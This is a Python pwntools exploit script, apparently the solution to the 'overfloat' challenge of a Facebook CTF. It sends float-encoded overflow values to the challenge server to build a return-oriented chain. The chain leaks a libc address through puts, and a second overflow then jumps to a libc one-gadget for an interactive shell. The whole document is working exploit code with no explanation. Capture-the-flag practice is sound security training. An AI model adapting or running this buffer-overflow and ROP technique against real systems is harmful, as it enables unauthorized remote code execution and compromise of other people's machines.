from pwn import *
from decimal import Decimal

w = remote("challenges.fbctf.com",1341)
ww = ELF("./overfloat")
www = ELF("./libc-2.27.so")

sla = w.sendlineafter
sl = w.sendline

def ff(f):
    return str(struct.unpack('f',p32(f))[0])

rdi = 0x400a83
puts_p = ww.plt['puts']
puts_g = ww.got['puts']
gets_p = ww.plt['fgets']
bsss = ww.bss()+0x200

for i in range(0,6):
    sla(str(i)+"]:","w")
    sla(str(i)+"]:","a")

sl(ff(bsss))
sl("w")

sl(ff(rdi))
sl("w")

sl(ff(puts_g))
sl("w")

sl(ff(puts_p))
sl("w")

sl(ff(0x400740))
sl("w")

sl("done\x00")

w.recvuntil("BON VOYAGE!")

libc = u64(w.recv(8)[1:-1].ljust(8,"\x00")) - www.symbols['puts']
print hex(libc)

one = [ 0x4f2c5, 0x4f322, 0x10a38c ]

for i in range(0,6):
    sla(str(i)+"]:","w")
    sla(str(i)+"]:","a")

sl(ff(bsss))
sl("a")

one_shot = p64(libc+one[0])
low = one_shot[:4]
high = one_shot[4:8]
sl(ff(u32(low)))
sl(ff(u32(high)))
sl("done\x00")

w.interactive()
